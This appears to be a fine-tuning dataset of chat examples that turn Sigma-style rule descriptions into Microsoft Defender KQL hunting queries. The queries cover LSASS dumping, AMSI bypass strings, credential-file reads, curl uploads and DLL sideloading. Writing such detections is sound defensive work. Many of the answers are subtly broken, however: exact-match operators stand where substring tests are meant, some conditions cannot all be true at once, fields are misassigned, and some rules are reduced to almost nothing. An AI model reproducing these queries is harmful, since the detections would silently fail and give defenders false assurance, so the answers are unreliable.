{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack Topic: proc_creation_win_rundll32_susp_shellexec_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"ShellExec_RunDLL\" and (ProcessCommandLine in~ (\"\\\\Desktop\\\\\", \"\\\\Temp\\\\\", \"\\\\Users\\\\Public\\\\\", \"comspec\", \"iex\", \"Invoke-\", \"msiexec\", \"odbcconf\", \"regsvr32\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects SharpLdapWhoami, a whoami alternative that queries the LDAP service on a domain controller Topic: proc_creation_win_hktl_sharpldapwhoami"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \" /method:ntlm\" or ProcessCommandLine endswith \" /method:kerb\" or ProcessCommandLine endswith \" /method:nego\" or ProcessCommandLine endswith \" /m:nego\" or ProcessCommandLine endswith \" /m:ntlm\" or ProcessCommandLine endswith \" /m:kerb\") or InitiatingProcessFolderPath =~ \"\\\\SharpLdapWhoami.exe\" or (ProcessVersionInfoOriginalFileName contains \"SharpLdapWhoami\" or ProcessVersionInfoProductName =~ \"SharpLdapWhoami\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may search the Registry on compromised systems for insecurely stored credentials.\nThe Windows Registry stores configuration information that can be used by the system or other programs.\nAdversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services\n Topic: proc_creation_win_reg_enumeration_for_credentials_in_registry"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" query \", \"/t \", \"REG_SZ\", \"/s\")) and InitiatingProcessFolderPath =~ \"\\\\reg.exe\") and ((ProcessCommandLine contains \"/f \" and ProcessCommandLine contains \"HKLM\") or (ProcessCommandLine contains \"/f \" and ProcessCommandLine contains \"HKCU\") or ProcessCommandLine contains \"HKCU\\\\Software\\\\SimonTatham\\\\PuTTY\\\\Sessions\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL hijacking technique used by NOBELIUM in their FoggyWeb backdoor. Which loads a malicious version of the expected \"version.dll\" dll Topic: image_load_malware_foggyweb_nobelium"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath =~ \"C:\\\\Windows\\\\ADFS\\\\version.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of WMIC to query information on a remote system Topic: proc_creation_win_wmic_remote_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"/node:\" and (FolderPath endswith \"\\\\WMIC.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")) and (not((ProcessCommandLine in~ (\"/node:127.0.0.1 \", \"/node:localhost \"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an attacker trying to enable the outlook security setting \"EnableUnsafeClientMailRules\" which allows outlook to run applications or execute macros Topic: registry_set_office_outlook_enable_unsafe_client_mail_rules"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Outlook\\\\Security\\\\EnableUnsafeClientMailRules\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of Windows Defender \"OfflineScannerShell.exe\" from its non standard directory.\nThe \"OfflineScannerShell.exe\" binary is vulnerable to DLL side loading and will load any DLL named \"mpclient.dll\" from the current working directory.\n Topic: proc_creation_win_offlinescannershell_mpclient_sideloading"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\OfflineScannerShell.exe\" or ProcessVersionInfoOriginalFileName =~ \"OfflineScannerShell.exe\") and (not((InitiatingProcessFolderPath =~ \"\" or InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\Windows Defender\\\\Offline\\\\\" or isnull(InitiatingProcessFolderPath))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification addition to the TypedPaths key in the user or admin registry via the commandline. Which might indicate persistence attempt Topic: proc_creation_win_registry_typed_paths_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\TypedPaths\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.) Topic: proc_creation_win_office_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\EQNEDT32.EXE\", \"\\\\EXCEL.EXE\", \"\\\\MSACCESS.EXE\", \"\\\\MSPUB.exe\", \"\\\\ONENOTE.EXE\", \"\\\\POWERPNT.exe\", \"\\\\VISIO.exe\", \"\\\\WINWORD.EXE\", \"\\\\wordpad.exe\", \"\\\\wordview.exe\")) and (((ProcessVersionInfoOriginalFileName in~ (\"bitsadmin.exe\", \"CertOC.exe\", \"CertUtil.exe\", \"Cmd.Exe\", \"CMSTP.EXE\", \"cscript.exe\", \"curl.exe\", \"HH.exe\", \"IEExec.exe\", \"InstallUtil.exe\", \"javaw.exe\", \"Microsoft.Workflow.Compiler.exe\", \"msdt.exe\", \"MSHTA.EXE\", \"msiexec.exe\", \"Msxsl.exe\", \"odbcconf.exe\", \"pcalua.exe\", \"PowerShell.EXE\", \"RegAsm.exe\", \"RegSvcs.exe\", \"REGSVR32.exe\", \"RUNDLL32.exe\", \"schtasks.exe\", \"ScriptRunner.exe\", \"wmic.exe\", \"WorkFolders.exe\", \"wscript.exe\")) or (FolderPath endswith \"\\\\AppVLP.exe\" or FolderPath endswith \"\\\\bash.exe\" or FolderPath endswith \"\\\\bitsadmin.exe\" or FolderPath endswith \"\\\\certoc.exe\" or FolderPath endswith \"\\\\certutil.exe\" or FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cmstp.exe\" or FolderPath endswith \"\\\\control.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\curl.exe\" or FolderPath endswith \"\\\\forfiles.exe\" or FolderPath endswith \"\\\\hh.exe\" or FolderPath endswith \"\\\\ieexec.exe\" or FolderPath endswith \"\\\\installutil.exe\" or FolderPath endswith \"\\\\javaw.exe\" or FolderPath endswith \"\\\\mftrace.exe\" or FolderPath endswith \"\\\\Microsoft.Workflow.Compiler.exe\" or FolderPath endswith \"\\\\msbuild.exe\" or FolderPath endswith \"\\\\msdt.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\msidb.exe\" or FolderPath endswith \"\\\\msiexec.exe\" or FolderPath endswith \"\\\\msxsl.exe\" or FolderPath endswith \"\\\\odbcconf.exe\" or FolderPath endswith \"\\\\pcalua.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\regasm.exe\" or FolderPath endswith \"\\\\regsvcs.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\schtasks.exe\" or FolderPath endswith \"\\\\scrcons.exe\" or FolderPath endswith \"\\\\scriptrunner.exe\" or FolderPath endswith \"\\\\sh.exe\" or FolderPath endswith \"\\\\svchost.exe\" or FolderPath endswith \"\\\\verclsid.exe\" or FolderPath endswith \"\\\\wmic.exe\" or FolderPath endswith \"\\\\workfolders.exe\" or FolderPath endswith \"\\\\wscript.exe\")) or (FolderPath contains \"\\\\AppData\\\\\" or FolderPath contains \"\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\ProgramData\\\\\" or FolderPath contains \"\\\\Windows\\\\Tasks\\\\\" or FolderPath contains \"\\\\Windows\\\\Temp\\\\\" or FolderPath contains \"\\\\Windows\\\\System32\\\\Tasks\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "A General detection for files being created in the Windows startup directory. This could be an indicator of persistence. Topic: file_event_win_startup_folder_file_write"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\StartUp\" and (not((InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\wuauclt.exe\" or FolderPath startswith \"C:\\\\$WINDOWS.~BT\\\\NewOS\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects enumeration of local systeam accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior. Topic: proc_creation_lnx_local_account"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/lastlog\" or ProcessCommandLine =~ \"'x:0:'\" or ((ProcessCommandLine in~ (\"/etc/passwd\", \"/etc/shadow\", \"/etc/sudoers\", \"/etc/spwd.db\", \"/etc/pwd.db\", \"/etc/master.passwd\")) and (InitiatingProcessFolderPath in~ (\"/cat\", \"/ed\", \"/head\", \"/more\", \"/nano\", \"/tail\", \"/vi\", \"/vim\", \"/less\", \"/emacs\", \"/sqlite3\", \"/makemap\"))) or InitiatingProcessFolderPath =~ \"/id\" or (ProcessCommandLine =~ \"-u\" and InitiatingProcessFolderPath =~ \"/lsof\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious curl process start the adds a file to a web request Topic: proc_creation_lnx_susp_curl_fileupload"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((ProcessCommandLine contains \" --form\" or ProcessCommandLine contains \" --upload-file \" or ProcessCommandLine contains \" --data \" or ProcessCommandLine contains \" --data-\") or ProcessCommandLine matches regex \"\\\\s-[FTd]\\\\s\") and InitiatingProcessFolderPath =~ \"/curl\") and (not((ProcessCommandLine in~ (\"://localhost\", \"://127.0.0.1\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes in Sysmon driver altitude value.\nIf the Sysmon driver is configured to load at an altitude of another registered service, it will fail to load at boot.\n Topic: registry_set_change_sysmon_driver_altitude"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Services*\" and RegistryKey endswith \"\\\\Instances\\\\Sysmon Instance\\\\Altitude\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL sideloading of \"dbgcore.dll\" Topic: image_load_side_load_dbgcore"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\dbgcore.dll\" and (not((FolderPath startswith \"C:\\\\Program Files (x86)\\\\\" or FolderPath startswith \"C:\\\\Program Files\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SoftwareDistribution\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SystemTemp\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\"))) and (not(FolderPath endswith \"\\\\Steam\\\\bin\\\\cef\\\\cef.win7x64\\\\dbgcore.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"dotnet-dump\" with the \"collect\" flag. The execution could indicate potential process dumping of critical processes such as LSASS.\n Topic: proc_creation_win_dotnetdump_memory_dump"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"collect\" and (FolderPath endswith \"\\\\dotnet-dump.exe\" or ProcessVersionInfoOriginalFileName =~ \"dotnet-dump.dll\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects use of chcp to look up the system locale value as part of host discovery Topic: proc_creation_win_chcp_codepage_lookup"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"chcp\" or ProcessCommandLine endswith \"chcp \" or ProcessCommandLine endswith \"chcp  \") and (InitiatingProcessCommandLine in~ (\" -c \", \" -r \", \" -k \")) and InitiatingProcessFileName =~ \"\\\\cmd.exe\" and InitiatingProcessFolderPath =~ \"\\\\chcp.com\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects installation of suspicious packages using system installation utilities Topic: proc_creation_lnx_install_suspicioua_packages"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine =~ \"install\" and (InitiatingProcessFolderPath in~ (\"/apt\", \"/apt-get\"))) or ((ProcessCommandLine in~ (\"--install\", \"-i\")) and InitiatingProcessFolderPath =~ \"/dpkg\") or (ProcessCommandLine =~ \"-i\" and InitiatingProcessFolderPath =~ \"/rpm\") or ((ProcessCommandLine in~ (\"localinstall\", \"install\")) and InitiatingProcessFolderPath =~ \"/yum\")) and (ProcessCommandLine in~ (\"nmap\", \" nc\", \"netcat\", \"wireshark\", \"tshark\", \"openconnect\", \"proxychains\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious LSASS process process clone that could be a sign of credential dumping activity Topic: proc_creation_win_lsass_process_clone"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\Windows\\\\System32\\\\lsass.exe\" and InitiatingProcessFolderPath =~ \"\\\\Windows\\\\System32\\\\lsass.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a malicious DLL file in the location where the OneDrive or Team applications\nUpon execution of the Teams or OneDrive application, the dropped malicious DLL file (\"iphlpapi.dll\") is sideloaded\n Topic: file_event_win_iphlpapi_dll_sideloading"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"iphlpapi.dll\", \"\\\\AppData\\\\Local\\\\Microsoft\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects CLR DLL being loaded by an Office Product Topic: image_load_office_dotnet_clr_dll_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath contains \"\\\\clr.dll\" and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\mspub.exe\", \"\\\\outlook.exe\", \"\\\\onenote.exe\", \"\\\\onenoteim.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enumeration of a specific DLL or EXE being used by a binary via \"tasklist.exe\".\nThis is often used by attackers in order to find the specific process identifier (PID) that is using the DLL in question.\nIn order to dump the process memory or perform other nefarious actions.\n Topic: proc_creation_win_tasklist_module_enumeration"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"-m\" or ProcessCommandLine contains \"/m\" or ProcessCommandLine contains \"\u2013m\" or ProcessCommandLine contains \"\u2014m\" or ProcessCommandLine contains \"\u2015m\") and (FolderPath endswith \"\\\\tasklist.exe\" or ProcessVersionInfoOriginalFileName =~ \"tasklist.exe\") and ProcessCommandLine =~ \"rdpcorets.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool. Topic: proc_creation_win_susp_disable_raccine"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"taskkill \", \"RaccineSettings.exe\")) or (ProcessCommandLine in~ (\"reg.exe\", \"delete\", \"Raccine Tray\")) or (ProcessCommandLine in~ (\"schtasks\", \"/DELETE\", \"Raccine Rules Updater\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers Topic: proc_creation_win_susp_redirect_local_admin_share"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \">\" and (ProcessCommandLine in~ (\"\\\\\\\\127.0.0.1\\\\admin$\\\\\", \"\\\\\\\\localhost\\\\admin$\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the redirection character \">\" to redirect information on the command line.\nThis technique is sometimes used by malicious actors in order to redirect the output of reconnaissance commands such as \"hostname\" and \"dir\" to files for future exfiltration.\n Topic: proc_creation_win_cmd_redirect"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \">\" and (ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\" or FolderPath endswith \"\\\\cmd.exe\")) and (not((ProcessCommandLine in~ (\"C:\\\\Program Files (x86)\\\\Internet Download Manager\\\\IDMMsgHost.exe\", \"chrome-extension://\", \"\\\\.\\\\pipe\\\\chrome.nativeMessaging\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file with the \".dll\" extension that has the name of a System DLL in uncommon or unsuspected locations. (Outisde of \"System32\", \"SysWOW64\", etc.).\nIt is highly recommended to perform an initial baseline before using this rule in production.\n Topic: file_event_win_creation_system_dll_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\secur32.dll\", \"\\\\tdh.dll\")) and (not((FileName in~ (\"C:\\\\$WINDOWS.~BT\\\\\", \"C:\\\\$WinREAgent\\\\\", \"C:\\\\Windows\\\\SoftwareDistribution\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\", \"C:\\\\Windows\\\\WinSxS\\\\\", \"C:\\\\Windows\\\\uus\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of an LSASS dump file in the \"CrashDumps\" folder. This could be a sign of LSASS credential dumping. Techniques such as the LSASS Shtinkering have been seen abusing the Windows Error Reporting to dump said process. Topic: file_event_win_lsass_shtinkering"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".dmp\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation or modification of a vscode related powershell profile which could indicate suspicious activity as the profile can be used as a mean of persistence Topic: file_event_win_susp_vscode_powershell_profile"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Microsoft.VSCode_profile.ps1\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Checks whether the image specified in a process creation event is not a full, absolute path (caused by process ghosting or other unorthodox methods to start a process) Topic: proc_creation_win_susp_image_missing"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (not(FolderPath contains \"\\\\\")) and (not((isnull(FolderPath) or (FolderPath in~ (\"-\", \"\")) or ((FolderPath in~ (\"System\", \"Registry\", \"MemCompression\", \"vmmem\")) or (ProcessCommandLine in~ (\"Registry\", \"MemCompression\", \"vmmem\"))))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential path traversal attempt via cmd.exe. Could indicate possible command/argument confusion/hijacking Topic: proc_creation_win_cmd_path_traversal"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((InitiatingProcessCommandLine contains \"/c\" or InitiatingProcessCommandLine contains \"/k\" or InitiatingProcessCommandLine contains \"/r\") or (ProcessCommandLine contains \"/c\" or ProcessCommandLine contains \"/k\" or ProcessCommandLine contains \"/r\")) and (InitiatingProcessFolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"cmd.exe\") and (InitiatingProcessCommandLine =~ \"/../../\" or ProcessCommandLine contains \"/../../\")) and (not(ProcessCommandLine =~ \"\\\\Tasktop\\\\keycloak\\\\bin\\\\/../../jre\\\\bin\\\\java\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious printer driver installation with an empty Manufacturer value Topic: registry_set_susp_printer_driver"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey contains \"\\\\Control\\\\Print\\\\Environments\\\\Windows x64\\\\Drivers\" and RegistryKey contains \"\\\\Manufacturer\") and RegistryValueData =~ \"(Empty)\") and (not((RegistryKey endswith \"\\\\CutePDF Writer v4.0*\" or (RegistryKey endswith \"\\\\VNC Printer (PS)*\" or RegistryKey endswith \"\\\\VNC Printer (UD)*\") or RegistryKey endswith \"\\\\Version-3\\\\PDF24*\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Request to \"amsiInitFailed\" that can be used to disable AMSI Scanning Topic: proc_creation_win_powershell_amsi_init_failed_bypass"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"System.Management.Automation.AmsiUtils\" and ProcessCommandLine contains \"amsiInitFailed\") or (ProcessCommandLine contains \"[Ref].Assembly.GetType\" and ProcessCommandLine contains \"SetValue($null,$true)\" and ProcessCommandLine contains \"NonPublic,Static\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations.\n Topic: proc_creation_win_susp_copy_system_dir_lolbin"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine =~ \"copy \" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or ((FolderPath endswith \"\\\\robocopy.exe\" or FolderPath endswith \"\\\\xcopy.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"robocopy.exe\", \"XCOPY.EXE\"))) or ((ProcessCommandLine in~ (\"copy-item\", \" copy \", \"cpi \", \" cp \")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")))) and ((ProcessCommandLine in~ (\"\\\\bitsadmin.exe\", \"\\\\calc.exe\", \"\\\\certutil.exe\", \"\\\\cmdl32.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\rundll32.exe\", \"\\\\wscript.exe\")) and (ProcessCommandLine in~ (\"\\\\System32\", \"\\\\SysWOW64\", \"\\\\WinSxS\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects non-sysinternals tools setting the \"accepteula\" key which normally is set on sysinternals tool execution Topic: registry_set_renamed_sysinternals_eula_accepted"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey contains \"\\\\PsExec\" or RegistryKey contains \"\\\\ProcDump\" or RegistryKey contains \"\\\\Handle\" or RegistryKey contains \"\\\\LiveKd\" or RegistryKey contains \"\\\\Process Explorer\" or RegistryKey contains \"\\\\PsLoglist\" or RegistryKey contains \"\\\\PsPasswd\" or RegistryKey contains \"\\\\Active Directory Explorer\") and RegistryKey endswith \"\\\\EulaAccepted\") and (not((InitiatingProcessFolderPath in~ (\"\\\\PsExec.exe\", \"\\\\PsExec64.exe\", \"\\\\procdump.exe\", \"\\\\procdump64.exe\", \"\\\\handle.exe\", \"\\\\handle64.exe\", \"\\\\livekd.exe\", \"\\\\livekd64.exe\", \"\\\\procexp.exe\", \"\\\\procexp64.exe\", \"\\\\psloglist.exe\", \"\\\\psloglist64.exe\", \"\\\\pspasswd.exe\", \"\\\\pspasswd64.exe\", \"\\\\ADExplorer.exe\", \"\\\\ADExplorer64.exe\")))) and (not(isnull(InitiatingProcessFolderPath)))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious and uncommon child processes of WmiPrvSE Topic: proc_creation_win_wmiprvse_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\wbem\\\\WmiPrvSE.exe\" and ((InitiatingProcessFolderPath in~ (\"\\\\certutil.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\msiexec.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\verclsid.exe\", \"\\\\wscript.exe\")) or ((ProcessCommandLine in~ (\"cscript\", \"mshta\", \"powershell\", \"pwsh\", \"regsvr32\", \"rundll32\", \"wscript\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\")) and (not(((ProcessCommandLine =~ \"/i \" and InitiatingProcessFolderPath =~ \"\\\\msiexec.exe\") or InitiatingProcessFolderPath =~ \"\\\\WerFault.exe\" or InitiatingProcessFolderPath =~ \"\\\\WmiPrvSE.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file with an uncommon extension in an Office application startup folder Topic: file_event_win_office_uncommon_file_startup"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (((FolderPath contains \"\\\\Microsoft\\\\Word\\\\STARTUP\" or (FolderPath contains \"\\\\Office\" and FolderPath contains \"\\\\Program Files\" and FolderPath contains \"\\\\STARTUP\")) and (not((FileName in~ (\".docb\", \".docm\", \".docx\", \".dotm\", \".mdb\", \".mdw\", \".pdf\", \".wll\", \".wwl\"))))) or ((FolderPath contains \"\\\\Microsoft\\\\Excel\\\\XLSTART\" or (FolderPath contains \"\\\\Office\" and FolderPath contains \"\\\\Program Files\" and FolderPath contains \"\\\\XLSTART\")) and (not((FileName in~ (\".xll\", \".xls\", \".xlsm\", \".xlsx\", \".xlt\", \".xltm\", \".xlw\")))))) and (not((((InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft Office\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft Office\\\\\") and (InitiatingProcessFolderPath in~ (\"\\\\winword.exe\", \"\\\\excel.exe\"))) or (InitiatingProcessFolderPath has_all (\"\\\\OfficeClickToRun.exe\") and InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\ClickToRun\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"vivaldi_elf.dll\" Topic: image_load_side_load_vivaldi_elf"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\vivaldi_elf.dll\" and (not((FolderPath contains \"\\\\Vivaldi\\\\Application\\\\\" and InitiatingProcessFolderPath =~ \"\\\\Vivaldi\\\\Application\\\\vivaldi.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of CSharp interactive console by PowerShell Topic: proc_creation_win_csi_use_of_csharp_console"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\powershell_ise.exe\")) and ProcessVersionInfoOriginalFileName =~ \"csi.exe\" and InitiatingProcessFolderPath =~ \"\\\\csi.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the Setting of Windows Defender Exclusions Topic: registry_set_defender_exclusions"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows Defender\\\\Exclusions\""}]}
